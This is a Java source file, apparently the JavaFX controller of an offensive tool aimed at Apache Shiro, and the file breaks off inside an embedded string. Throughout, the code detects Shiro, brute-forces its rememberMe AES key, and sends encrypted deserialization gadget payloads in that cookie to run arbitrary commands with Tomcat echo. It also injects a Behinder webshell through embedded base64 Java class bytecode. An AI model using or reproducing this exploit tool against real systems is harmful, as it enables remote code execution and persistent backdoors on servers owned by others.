package cn.safe6;

import cn.safe6.core.Constants;
import cn.safe6.core.ControllersFactory;
import cn.safe6.core.http.Request;
import cn.safe6.core.jobs.BurstJob;
import cn.safe6.util.*;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.lang.reflect.Method;
import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Controller {

    @FXML
    public Button scan;

    @FXML
    public ChoiceBox method;

    @FXML
    public TextArea postData;

    @FXML
    public Button burstKey;

    @FXML
    public CheckBox gcm;

    @FXML
    public ChoiceBox gadget;

    @FXML
    public ChoiceBox serverType;

    @FXML
    public TextField cmd;

    @FXML
    public Button execCmd;

    @FXML
    public ChoiceBox checkType;

    @FXML
    public TextArea note;
    @FXML
    public TextArea log;

    final private Map<String, Object> paramsContext = ControllersFactory.paramsContext;
    @FXML
    public CheckBox isShowPayload;

    @FXML
    public TextField rememberMe;
    @FXML
    public TextField aesKey;

    @FXML
    public Button inject;

    @FXML
    public TextField shellPasswd;

    @FXML
    public ChoiceBox shellType;

    @FXML
    public TextField path;

    ExecutorService pool = Executors.newFixedThreadPool(8);

    public static LogUtil logUtil;

    @FXML
    private TextField target;


    @FXML
    private MenuItem proxySetupBtn;


    // 设置相关信息保存
    public static Map<String, Object> settingInfo = new HashMap();


    public void initEvent() {
        method.setOnAction(event -> {
                    if (method.getValue().equals("POST")) {
                        postData.setDisable(false);
                        logUtil.printInfoLog("post可直接使用burp抓到包。如果目标站点是https，请填写对应的URL！", false);
                    }
                    if (method.getValue().equals("GET")) {
                        postData.setDisable(true);
                    }
                }
        );

    }


    // 基本配置信息
    public void basic() {
        //初始化日志
        logUtil = new LogUtil(this.log);

        ControllersFactory.controllers.put(Controller.class.getSimpleName(), this);

        this.log.setText(Constants.BASICINFO);
        this.log.setWrapText(true);

        this.note.setText("可用于临时记录\r\n");
        this.note.setWrapText(true);

        ObservableList<String> methodData = FXCollections.observableArrayList("GET", "POST");
        method.setValue("GET");
        method.setItems(methodData);

        ObservableList<String> checkTypeData = FXCollections.observableArrayList("SimplePrincipalCollection", "dnsLog.cn");
        checkType.setValue("SimplePrincipalCollection");
        checkType.setItems(checkTypeData);

        ObservableList<String> serverTypeData = FXCollections.observableArrayList("Tomcat7", "Tomcat8");
        serverType.setValue("Tomcat7");
        serverType.setItems(serverTypeData);

        ObservableList<String> shellTypeData = FXCollections.observableArrayList("Behinder");
        shellType.setValue("Behinder");
        shellType.setItems(shellTypeData);

        ObservableList<String> gadgetData = FXCollections.observableArrayList();
        gadgetData.add("CommonsBeanutils1");
        gadgetData.add("CommonsCollections11");
        gadgetData.add("CommonsCollectionsK1");
        gadgetData.add("CommonsCollectionsK2");
        // gadgetData.add("CommonsCollectionsK3");
        //gadgetData.add("CommonsCollectionsK4");
        //gadgetData.add("CommonsCollectionsShiro");

        gadget.setValue("CommonsCollectionsK1");
        gadget.setItems(gadgetData);


    }

    @FXML
    public void startScan() {


        scan.setDisable(true);

        scan.setDisable(false);

    }


    public void initialize() {
        try {
            this.initToolbar();
            this.basic();
            this.initEvent();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @FXML
    public void burstKey(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> burstKey.setDisable(true));

            this.validAllDataAndSetConfig();
            List<String> keys = this.getShiroKeys();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
            Map<String, Object> header = (Map<String, Object>) paramsContext.get("header");
            if (header == null) {
                header = new HashMap<>();
            }
            if (params == null) {
                params = new HashMap<>();
            }

            logUtil.printInfoLog("开始检查目标是否用了shiro", false);
            if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
                logUtil.printSucceedLog("发现shiro特征");
                pool.submit(new BurstJob(url, method, params, keys));
            } else {
                logUtil.printAbortedLog("未发现shiro特征", false);
                logUtil.printInfoLog("停止爆破", true);
                //burstKey.setDisable(false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            //burstKey.setDisable(false);
            Platform.runLater(() -> burstKey.setDisable(false));
        }


    }

    @FXML
    public void execCmd(ActionEvent actionEvent) throws IOException {
        try {
            Platform.runLater(() -> execCmd.setDisable(true));
            Thread.sleep(50);

            this.validAllDataAndSetConfig();
            String cmd1 = cmd.getText();
            if (cmd1 == null || cmd1.trim().equals("")) {
                Tools.alert("命令错误", "请输入一条命令如whoami");
                return;
            }
            String key = aesKey.getText();
            if (key == null || key.trim().equals("")) {
                Tools.alert("AES密钥错误", "请输入密钥");
                return;
            }


            String expName = gadget.getValue().toString();
            //String echo = serverType.getValue().toString();
            String echo = "TomcatEcho";
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");

            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echo);
            Method mtd = clazz.getMethod("getPayload", byte[].class);

            byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));

            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }
            // = PayloadEncryptTool.AesGcmEncrypt(payload,key);
            String data;

            //请求包header超过8k会报header too large错误
            header.put("cookie", rmeValue + "=" + encryptData);
            header.put("s6", cmd1);
            if (isShowPayload.isSelected()) {
                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                Controller.logUtil.printData(header.toString());
            }

            if (method.equals(Constants.METHOD_GET)) {
                // data = HttpClientUtil.httpGetRequest(url, header);
                data = HttpTool.get(url, header);
            } else {
                data = HttpClientUtil.httpPostRequest(url, header, params);
            }
            if (data != null) {
                if (data.contains("$$")) {
                    logUtil.printData(data.replace("$", ""));
                } else {
                    logUtil.printWarningLog("未获取到回显!", true);
                    logUtil.printData(data);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Platform.runLater(() -> execCmd.setDisable(false));
        }

    }

    @FXML
    public void injectShell(ActionEvent actionEvent) {
        try {

            Platform.runLater(() -> inject.setDisable(true));
            Thread.sleep(50);

            this.validAllDataAndSetConfig();
            String shellPath = path.getText();


            String key = aesKey.getText();
            if (key == null || key.trim().equals("")) {
                Tools.alert("AES密钥错误", "请输入密钥");
                return;
            }

            if (shellPath == null || shellPath.trim().equals("")) {
                Tools.alert("路径错误", "请输入shell路径");
                return;
            }
            String passwd = shellPasswd.getText();
            if (passwd == null || passwd.trim().equals("")) {
                Tools.alert("shell密码错误", "请输入shell密码");
                return;
            }


            String expName = gadget.getValue().toString();
            String shell = shellType.getValue().toString();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");

            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
            //Class clazz1 = Class.forName(Constants.PAYLOAD_PACK+echo);
            Method mtd = clazz.getMethod("getPayload", byte[].class);

            byte[] BehinderLoaderBytes = Base64.getDecoder().decode(paramsContext.get("BehinderLoader").toString());
            byte[] payload = (byte[]) mtd.invoke(null, BehinderLoaderBytes);

            //byte[] bytes = Serializer.serialize(getObject.invoke(gadgetClass.newInstance(), BehinderLoaderBytes));

            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);

            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }

            Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
            Method mtd1 = clazz1.getMethod("tomcatEchoPayload", String.class);

            //解决长度问题，把大payload放post包提交

            if (params == null) {
                params = new HashMap<>();
                params.put("classData1", paramsContext.get("PageContext"));
                //反射设置密码，取shell
                params.put("classData2", Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd)));
            }


            //请求包header超过8k会报header too large错误
            header.put("cookie", rmeValue + "=" + encryptData);
            if (isShowPayload.isSelected()) {
                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                Controller.logUtil.printData(header.toString());
            }

/*            if (method.equals(Constants.METHOD_GET)) {
                url = this.parseGetData(url, params);
                data = HttpTool.get(url, header);
            } else {

            }*/
            //只能用post进行注入，get参数太长
            String data= HttpClientUtil.httpPostRequest(url, header, params);
            if (data != null) {
                logUtil.printData(data);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Platform.runLater(() -> inject.setDisable(false));
        }

    }


    /**
     * 校验必填,设置config数据
     */
    private void validAllDataAndSetConfig() {
        //logUtil.printInfoLog("检测参数中。。。。。",true);
        String url = this.target.getText().trim();
        if (method.getValue().equals(Constants.METHOD_GET)) {
            if (!Tools.checkTheURL(url)) {
                Tools.alert("URL检查", "URL格式不符合要求，示例：http://127.0.0.1:8080/login");
                return;
            }
            paramsContext.put("url", url);
            paramsContext.put("method", Constants.METHOD_GET);
        } else {
            paramsContext.put("method", Constants.METHOD_POST);
            String requestBody = postData.getText();
            if (requestBody == null || requestBody.trim().equals("")) {
                Tools.alert("HTTP请求不能为空", "请输入一个有效的HTTP请求");
                return;
            }
            Request request = null;
            try {
                request = HttpTool.parseRequest(requestBody);
            } catch (Exception e) {
                // e.printStackTrace();
                Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
            }
            if (request != null) {
                paramsContext.put("header", request.getHeader());
                paramsContext.put("params", request.getParams());
                paramsContext.put("paramsStr", request.getParamsStr());
                if (!Tools.checkTheURL(url) && request.getRequestUrl() == null) {
                    Tools.alert("目标错误", "请输入url，或者输入完整的请求包");
                }

                if (Tools.checkTheURL(url)) {
                    request.setRequestUrl(url);
                } else {
                    paramsContext.put("url", request.getRequestUrl());
                }

            } else {
                Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
            }

        }
        String rmeValue = rememberMe.getText();
        if (rmeValue == null || rmeValue.trim().equals("")) {
            Tools.alert("shiro特征错误", "请输入一个特征如rememberMe");
            return;
        }

        paramsContext.put("rmeValue", rmeValue);
        paramsContext.put("checkType", checkType.getValue().toString());
        if (gcm.isSelected()) {
            paramsContext.put("AES", Constants.AES_GCM);
        } else {
            paramsContext.put("AES", Constants.AES_CBC);
        }

        paramsContext.put("BehinderLoader", "yv66vgAAADQAzwoAPQBaCgADAFsHAFwKACsAXQcAXgoAKwBfCgBgAGEKAGAAYgoABQBjCgBkAGUKAGQAZggAZwoAMABoBwBpCgBkAGoIAGsKAGwAbQgAbggAbwcAcAgAcQgAcggAcwoABQB0CAB1BwB2CwAaAHcLABoAeAcAeQgAegcAewoAHwB8BwB9CgAhAH4KACEAfwgAgAoAIQCBBwCCCgAmAFoKACYAgwcAhAgAhQcAhgcAhwkAMgCICgArAIkKAIoAYQcAiwoAKwCMBwCNCgAyAI4KAIoAjwgAkAoAKwCRBwCSBwCTCgCUAJUKAAMAlgcAlwoAOwB0BwCYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACGdldEZpZWxkAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlBwCZBwCGBwBeAQAKRXhjZXB0aW9ucwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAmgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgcAmwcAnAcAXAcAdgcAeQcAewcAfQcAnQcAngcAlwEAClNvdXJjZUZpbGUBABNCZWhpbmRlckxvYWRlci5qYXZhDAA+AD8MAJ8AoAEAEGphdmEvbGFuZy9PYmplY3QMAKEAogEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwAowCgBwCZDACkAKUMAKYApwwAPgCoBwCbDACpAKoMAKsArAEAB3RocmVhZHMMAEIAQwEAE1tMamF2YS9sYW5nL1RocmVhZDsMAK0ArgEABGV4ZWMHAJwMAK8AsAEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsDACxAD8BAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMALIAswwApgC0AQAdb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdEluZm8BAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DAC1ALQBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DAC2ALcMALgAuQEACmNsYXNzRGF0YTEMALoAuwEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMALwAvQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IMAL4AvwwAwADBBwDCAQAOQmVoaW5kZXJMb2FkZXIMAMMAxAEAEWphdmEvbGFuZy9JbnRlZ2VyDAA+AMUMAMYAxwEACmNsYXNzRGF0YTIMAMgAyQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQcAygwAywDMDADNAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEAEGphdmEvbGFuZy9TdHJpbmcBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAPcHJpbnRTdGFja1RyYWNlAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5vdGUBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAEKEkpVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgAhADAAPQAAAAAABQABAD4APwABAEAAAAAdAAEAAQAAAAUqtwABsQAAAAEAQQAAAAYAAQAAAAkACQBCAEMAAgBAAAAAmwADAAUAAAA4AU0qtgACTi0SA6UAFi0rtgAETacADToELbYABk6n/+osxgAOLAS2AAcsKrYACLC7AAVZK7cACb8AAQANABMAFgAFAAIAQQAAADIADAAAAEgAAgBJAAcASwANAE0AEwBOABYATwAYAFAAHQBRACAAVQAkAFYAKQBXAC8AWQBEAAAAEQAE/QAHBwBFBwBGTgcARwkOAEgAAAAEAAEAOwABAEkASgACAEAAAAAZAAAAAwAAAAGxAAAAAQBBAAAABgABAAAAYABIAAAABAABAEsAAQBJAEwAAgBAAAAAGQAAAAQAAAABsQAAAAEAQQAAAAYAAQAAAGUASAAAAAQAAQBLAAgATQA/AAEAQAAAA5UACQAVAAACMwM7uAAKtgALEgy4AA3AAA7AAA5MAz0cK76iAhErHDJOLcYB/C22AA86BBkEEhC2ABGaAewZBBIStgARmQHiLRITuAANOgUBOgYZBcEAFJkAIBkFEhW4AA0SFrgADRIXuAANOganAAo6BxkHtgAYGQbGAa0ZBhIZuAANwAAaOgcDPRwZB7kAGwEAogGUGQccuQAcAgDAAB06CBkIEh64AA3AAB86CRkJBLYAIMAAIToKGQq2ACI6CxkKtgAjOgwZChIktgAlOg27ACZZtwAnGQ22ACg6DhIpEioGvQArWQMSLFNZBLIALVNZBbIALVO2AC46DxkPBLYALxkPEjC2ADEGvQADWQMZDlNZBLsAMlkDtwAzU1kFuwAyWRkOvrcAM1O2ADTAACs6EBkKEjW2ACU6EbsAJlm3ACcZEbYAKDoSEikSKga9ACtZAxIsU1kEsgAtU1kFsgAtU7YALjoTGRMEtgAvGRMSMLYAMQa9AANZAxkSU1kEuwAyWQO3ADNTWQW7ADJZGRK+twAzU7YANMAAKzoUGRQEvQArWQMZEFO2ADYEvQADWQMZEAW9ACtZAxI3U1kEEjhTtgA2Bb0AA1kDGQpTWQQZC1O2ADlTtgA5B70AA1kDGQpTWQQZC1NZBRkMU1kGGRAFvQArWQMSN1NZBBI4U7YANgW9AANZAxkKU1kEGQtTtgA5U7YAOlenAAo6DRkNtgA8BDunAAMamQAGpwAJhAIBp/3vpwAISyq2ADyxAAMAUQBkAGcABQC+Ag4CEQA7AAACKgItADsAAgBBAAAAvgAvAAAADQACAA4AFAAPABwAEAAgABEAJAASACoAEwA+ABQARgAVAEkAFgBRABgAZAAbAGcAGQBpABoAbgAdAHMAHgB/AB8AjAAgAJkAIQClACIAsAAjALcAJAC+ACYAxwAnANUAKADzACkA+QAqASkAKwEyACwBQAAtAV4ALgFkAC8BlAAxAbgAMgH1ADMCDgA2AhEANAITADUCGAA3AhoAOAIdAD0CIQA+AiQADwIqAEMCLQBBAi4AQgIyAEQARAAAAHQAC/4AFgEHAA4B/wBQAAcBBwAOAQcATgcATwcAUAcAUAABBwBHBvwAEgcAUf8BjwANAQcADgEHAE4HAE8HAFAHAFAHAFEHAFIHAFMHAFQHAFUHAFYAAQcAVwb/AAQABAEHAA4BBwBOAAD6AAb4AAVCBwBXBAABAFgAAAACAFk=");
        paramsContext.put("PageContext", "yv66vgAAADQAMwoACAApCQAHACoJAAcAKwcALAsABAAtCgAIAC4HAC8HADABAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAGZ2V0T3V0AQASKClMamF2YS9pby9Xcml0ZXI7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9MamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQ7AQAGPGluaXQ%2BAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAEE1ldGhvZFBhcmFtZXRlcnMBAAMoKVYBAApzZXRSZXF1ZXN0AQAhKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OylWAQALc2V0UmVzcG9uc2UBACIoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAR0ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAFiAQACW0IBAApTb3VyY2VGaWxlAQAQUGFnZUNvbnRleHQuamF2YQwAFAAXDAAJAAoMAAsADAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMABwAHQwAMQAyAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEABwAIAAAAAgAAAAkACgAAAAAACwAMAAAACQABAA0ADgABAA8AAAAsAAEAAQAAAAIBsAAAAAIAEAAAAAYAAQAAABEAEQAAAAwAAQAAAAIAEgATAAAAAQAUABUAAgAPAAAAWQACAAMAAAAPKrcAASortQACKiy1AAOxAAAAAgAQAAAAEgAEAAAAFAAEABUACQAWAA4AFwARAAAAIAADAAAADwASABMAAAAAAA8ACQAKAAEAAAAPAAsADAACABYAAAAJAgAJAAAACwAAAAEAFAAXAAEADwAAADMAAQABAAAABSq3AAGxAAAAAgAQAAAACgACAAAAGQAEABsAEQAAAAwAAQAAAAUAEgATAAAAAQAYABkAAgAPAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAQAAAACgACAAAAHgAFAB8AEQAAABYAAgAAAAYAEgATAAAAAAAGAAkACgABABYAAAAFAQAJAAAAAQAaABsAAgAPAAAAPgACAAIAAAAGKiu1AAOxAAAAAgAQAAAACgACAAAAIgAFACMAEQAAABYAAgAAAAYAEgATAAAAAAAGAAsADAABABYAAAAFAQALAAAAAQAcAB0AAQAPAAAARwABAAIAAAAPKrQAAsAABEwruQAFAQCwAAAAAgAQAAAACgACAAAAJgAIACcAEQAAABYAAgAAAA8AEgATAAAACAAHAB4AHwABAAEAIAAhAAEADwAAAC8AAQABAAAABSq0AAKwAAAAAgAQAAAABgABAAAALAARAAAADAABAAAABQASABMAAAABACIAIwABAA8AAAAvAAEAAQAAAAUqtAADsAAAAAIAEAAAAAYAAQAAADEAEQAAAAwAAQAAAAUAEgATAAAAAQAeACQAAgAPAAAAPQAEAAIAAAAJKisDK763AAawAAAAAgAQAAAABgABAAAANQARAAAAFgACAAAACQASABMAAAAAAAkAJQAmAAEAFgAAAAUBACUAAAABACcAAAACACg%3D");
        //paramsContext.put("MemBehinder3", "yv66vgAAADQBZAoAMQCSCQA9AJMJAD0AlAcAlQcAlgsABACXCABmCwAEAJgLAAQAmQgAmgoAXgCbCACcCACdCwAFAJ4KAD0AnwgAoAsAOwChCgA8AKIKADwAowgApAoApQCmBwCnBwCoCgAXAJILADsAqQoAFwCqCACrCgAXAKwKABcArQoAXgCuCgAWAK8KAKUAsAsABACxCgCyALMIALQKACYAtQgAtgcAtwcAuAkAMgC5CgAmALoKALsAvAcAvQoAKwCSCgArAL4KAKUAvwoAMQDACgAmAMEHAMIHAMMKADIAxAoAuwDFCgAmAMYKADEAmwcAxwsAyADJBwDKBwDLBwDMBwDNBwDOCgA9AM8IANAIANEKAD0A0gcA0woAQgDUCADVCgDWANcKAF4A2AoA1gDZBwDaCgDWANsKAEgA3AoASADdCgBeAN4KAF4A3woAXgDgCwAEAOELAOIA4wgA5AoAJgDlCgDmALwKAOYA5wcA6AcA6QcA6ggA6wkA7ADtCgDmAO4LAOIA7wkA8ADxCgDyAPMHAPQLAPUA9ggA9woAJgD4CQDsAPkHAPoBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAARwYXNzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ%2BAQAiKExqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEACkV4Y2VwdGlvbnMHAPsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA1TdGFja01hcFRhYmxlBwCVBwCWBwDMBwDOBwD8BwD9BwD%2BBwD0BwDHBwD%2FAQAHZGVzdHJveQEAAygpVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgcAwgcAywcAzQcA0wEAA21kNQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQZHluYW1pY0FkZEZpbHRlcgEAZChMamF2YXgvc2VydmxldC9GaWx0ZXI7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KVYHAPoHAQAHAQEHAOgHAOkHAQQHAQUBAApTb3VyY2VGaWxlAQARTWVtQmVoaW5kZXIzLmphdmEMAGgAfgwAZgBnDABkAGUBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAQYBBwwBCACGDAEJAIYBAAdzdWNjZXNzDAB%2FAIABAAZJbmplY3QBAAdTdWNjZXNzDAEKAQsMAIUAhgEAAXUMAQwBDQwBDgEPDAEQAREBAANBRVMHARIMARMBFAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBFQEWDAEXARgBAAAMARcBGQwBGgEbDAEcAR0MAGgBHgwAbAEfDAEgASEHASIMASMBGwEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwBJAElAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBAAJbQgwBJgEnDAEoASkHASoMASsBLAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAS0BLgwBLwEwDAExATIMATMBNAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvSW50ZWdlcgwAaAE1DAE2ATcMATgBOQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAP4MAHABOgEAE1tMamF2YS9sYW5nL09iamVjdDsBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9